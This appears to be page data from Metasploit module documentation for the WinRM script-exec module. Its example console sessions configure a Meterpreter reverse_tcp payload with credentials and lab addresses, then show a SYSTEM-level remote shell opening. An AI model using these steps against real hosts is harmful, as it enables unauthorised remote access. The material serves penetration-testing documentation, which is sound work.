{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/winrm/winrm_script_exec","result":{"data":{"moduleMetadataJson":{"id":"79c8bb36-7f22-51d8-9797-4807531d6920","name":"WinRM Script Exec Remote Code Execution","fullname":"exploit/windows/winrm/winrm_script_exec","description":"This module uses valid credentials to login to the WinRM service\n          and execute a payload. It has two available methods for payload\n          delivery: Powershell 2.0 and VBS CmdStager.\n\n          The module will check if Powershell 2.0 is available, and if so uses\n          that method. Otherwise it falls back to the VBS CmdStager which is\n          less stealthy.\n\n          IMPORTANT: If targeting an x64 system with the Powershell method\n          you MUST select an x64 payload. An x86 payload will never return.","rank":0,"fields":{"detailsSlug":"/modules/details/exploit/windows/winrm/winrm_script_exec","documentationSlug":"/modules/documentation/exploit/windows/winrm/winrm_script_exec","referencesSlug":"/modules/references/exploit/windows/winrm/winrm_script_exec"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>WinRM, is a Windows-native built-in remote management protocol in its simplest form that uses Simple Object Access Protocol to interface with remote computers and servers, as well as Operating Systems and applications. It handles remote connections by means of the WS-Management Protocol, which is based on SOAP (Simple Object Access Protocol).\nThis module uses valid credentials to login to the WinRM service and execute a payload. It has two available methods for payload delivery: Powershell 2.0 and VBS CmdStager. This module will check if Poweshell 2.0 is available, and if so then it will use that method. Otherwise it falls back to the VBS CmdStager which is less stealthy.</p>\n<p><strong>IMPORTANT:</strong> If targetting an x64 system with the Poweshell method, one must select an x64 payload. An x86 payload will never return.</p>\n<h2 id=\"example-usage\" style=\"position:relative;\"><a href=\"#example-usage\" aria-label=\"example usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example Usage</h2>\n<h3 id=\"windows-2008\" style=\"position:relative;\"><a href=\"#windows-2008\" aria-label=\"windows 2008 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows 2008</h3>\n<p><strong>Powershell 2.0 is used for payload delivery here</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(handler) &gt; use exploit/windows/winrm/winrm_script_exec\nmsf exploit(winrm_script_exec) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf exploit(winrm_script_exec) &gt; set USERNAME admin\nUSERNAME =&gt; admin\nmsf exploit(winrm_script_exec) &gt; set PASSWORD admin\nPASSWORD =&gt; admin\nmsf exploit(winrm_script_exec) &gt; set LHOST 192.168.198.138\nLHOST =&gt; 192.168.198.138\nmsf exploit(winrm_script_exec) &gt; set LPORT 4444\nLPORT =&gt; 4444\nmsf exploit(winrm_script_exec) &gt; set RHOST 192.168.198.130\nRHOST =&gt; 192.168.198.130\nmsf  exploit(winrm_script_exec) &gt; exploit\n[*] Started reverse TCP handler on 192.168.198.138:4444 \n[*] checking for Powershell 2.0\n[*] Attempting to set Execution Policy\n[+] Set Execution Policy Successfully\n[*] Grabbing %TEMP%\n[*] Uploading powershell script to C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\uFWUOIgQ.ps1 (This may take a few minutes)...\n[*] Attempting to execute script...\n[*] Sending stage (752128 bytes) to 192.168.198.130\n[*] Meterpreter session 1 opened (192.168.198.138:4444 -&gt; 192.168.198.130:5985) at 2017-03-19 21:30:05 +0100\nmeterpreter &gt; \n[*] Session ID 1 (192.168.198.138:4444 -&gt; 192.168.198.130:5985) processing InitialAutoRunScript &#39;post/windows/manage/smart_migrate&#39;\n[*] Current server process: powershell.exe (608)\n[+] Migrating to 568\n[+] Successfully migrated to process \nmeterpreter &gt; sysinfo\ngComputer        : WIN-JZF4OTQMX4W\nOS              : Windows 2008 (Build 6002, Service Pack 2).\nArchitecture    : x86\nSystem Language : en_US\nMeterpreter     : x86/win32\nmeterpreter &gt; getuid\ngServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; getpid\nCurrent pid: 568\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>VBS CmdStager is used for payload delivery here</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(handler) &gt; use exploit/windows/winrm/winrm_script_exec\nmsf exploit(winrm_script_exec) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf exploit(winrm_script_exec) &gt; set USERNAME admin\nUSERNAME =&gt; admin\nmsf exploit(winrm_script_exec) &gt; set PASSWORD admin\nPASSWORD =&gt; admin\nmsf exploit(winrm_script_exec) &gt; set LHOST 192.168.198.138\nLHOST =&gt; 192.168.198.138\nmsf exploit(winrm_script_exec) &gt; set LPORT 4444\nLPORT =&gt; 4444\nmsf exploit(winrm_script_exec) &gt; set RHOST 192.168.198.130\nRHOST =&gt; 192.168.198.130\nmsf  exploit(winrm_script_exec) &gt; set FORCE_VBS true\nFORCE_VBS =&gt; true\nmsf  exploit(winrm_script_exec) &gt; exploit\n[*] Started reverse TCP handler on 192.168.198.138:4444 \n[*] User selected the FORCE_VBS option\n[*] Command Stager progress -   2.01% done (2046/101936 bytes)\n[*] Command Stager progress -   4.01% done (4092/101936 bytes)\n[*] Command Stager progress -   6.02% done (6138/101936 bytes)\n[*] Command Stager progress -   8.03% done (8184/101936 bytes)\n[*] Command Stager progress -  10.04% done (10230/101936 bytes)\n[*] Command Stager progress -  12.04% done (12276/101936 bytes)\n[*] Command Stager progress -  14.05% done (14322/101936 bytes)\n[*] Command Stager progress -  16.06% done (16368/101936 bytes)\n[*] Command Stager progress -  18.06% done (18414/101936 bytes)\n[*] Command Stager progress -  20.07% done (20460/101936 bytes)\n[*] Command Stager progress -  22.08% done (22506/101936 bytes)\n[*] Command Stager progress -  24.09% done (24552/101936 bytes)\n[*] Command Stager progress -  26.09% done (26598/101936 bytes)\n[*] Command Stager progress -  28.10% done (28644/101936 bytes)\n[*] Command Stager progress -  30.11% done (30690/101936 bytes)\n[*] Command Stager progress -  32.11% done (32736/101936 bytes)\n[*] Command Stager progress -  34.12% done (34782/101936 bytes)\n[*] Command Stager progress -  36.13% done (36828/101936 bytes)\n[*] Command Stager progress -  38.14% done (38874/101936 bytes)\n[*] Command Stager progress -  40.14% done (40920/101936 bytes)\n[*] Command Stager progress -  42.15% done (42966/101936 bytes)\n[*] Command Stager progress -  44.16% done (45012/101936 bytes)\n[*] Command Stager progress -  46.16% done (47058/101936 bytes)\n[*] Command Stager progress -  48.17% done (49104/101936 bytes)\n[*] Command Stager progress -  50.18% done (51150/101936 bytes)\n[*] Command Stager progress -  52.19% done (53196/101936 bytes)\n[*] Command Stager progress -  54.19% done (55242/101936 bytes)\n[*] Command Stager progress -  56.20% done (57288/101936 bytes)\n[*] Command Stager progress -  58.21% done (59334/101936 bytes)\n[*] Command Stager progress -  60.21% done (61380/101936 bytes)\n[*] Command Stager progress -  62.22% done (63426/101936 bytes)\n[*] Command Stager progress -  64.23% done (65472/101936 bytes)\n[*] Command Stager progress -  66.24% done (67518/101936 bytes)\n[*] Command Stager progress -  68.24% done (69564/101936 bytes)\n[*] Command Stager progress -  70.25% done (71610/101936 bytes)\n[*] Command Stager progress -  72.26% done (73656/101936 bytes)\n[*] Command Stager progress -  74.26% done (75702/101936 bytes)\n[*] Command Stager progress -  76.27% done (77748/101936 bytes)\n[*] Command Stager progress -  78.28% done (79794/101936 bytes)\n[*] Command Stager progress -  80.29% done (81840/101936 bytes)\n[*] Command Stager progress -  82.29% done (83886/101936 bytes)\n[*] Command Stager progress -  84.30% done (85932/101936 bytes)\n[*] Command Stager progress -  86.31% done (87978/101936 bytes)\n[*] Command Stager progress -  88.31% done (90024/101936 bytes)\n[*] Command Stager progress -  90.32% done (92070/101936 bytes)\n[*] Command Stager progress -  92.33% done (94116/101936 bytes)\n[*] Command Stager progress -  94.34% done (96162/101936 bytes)\n[*] Command Stager progress -  96.34% done (98208/101936 bytes)\n[*] Command Stager progress -  98.35% done (100252/101936 bytes)\n[*] Sending stage (752128 bytes) to 192.168.198.130\n[*] Meterpreter session 2 opened (192.168.198.138:4444 -&gt; 192.168.198.130:5985) at 2017-03-19 21:46:05 +0100\n[*] Session ID 2 (192.168.198.138:4444 -&gt; 192.168.1.142:49158) processing InitialAutoRunScript &#39;post/windows/manage/smart_migrate&#39;\n[*] Current server process: mSPvA.exe (3548)\n[+] Migrating to 580\n[+] Successfully migrated to process \n[*] nil\n[*] Command Stager progress - 100.00% done (101936/101936 bytes)\nmeterpreter &gt; getpid\nCurrent pid: 580\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; sysinfo\nComputer        : WIN-OPAUFTQFWTB\nOS              : Windows 2008 (Build 6002, Service Pack 2).\nArchitecture    : x86\nSystem Language : en_US\nMeterpreter     : x86/win32\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"79c8bb36-7f22-51d8-9797-4807531d6920"}}}